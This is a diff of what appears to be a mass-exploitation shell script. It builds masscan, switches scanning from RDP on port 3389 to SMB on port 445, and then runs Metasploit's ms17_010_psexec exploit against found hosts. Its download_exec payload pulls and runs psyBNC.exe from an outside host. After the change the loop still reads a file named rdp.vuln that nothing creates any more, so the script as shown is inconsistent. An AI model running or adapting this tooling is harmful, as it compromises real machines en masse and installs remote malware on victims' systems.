@@ -15,19 +15,12 @@ git clone https://github.com/robertdavidgraham/masscan.git;
 cd masscan;
 make -j8 && make install;
 cd ..;
-git clone https://github.com/robertdavidgraham/rdpscan.git;
-cd rdpscan;
-make -j8;
-chmod +x rdpscan;
-cp ./rdpscan ../rdp;
-cd ..;
-echo Installation step is done, now starting rdp scanner...;
+echo Installation step is done, now starting smb scanner...;
 sleep 5s;
-masscan -p 3389 --range $i --rate 10000 | ./rdp --file - >rdp.lst &
+masscan -p 445 --range $i --rate 10000 >smb.scan&
 sleep 1s;
 echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
 sleep 1m;
-grep appid rdp.lst >rdp.vuln;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
 for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.vuln`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
 echo !!!THE END OF THE WORLD!!!;
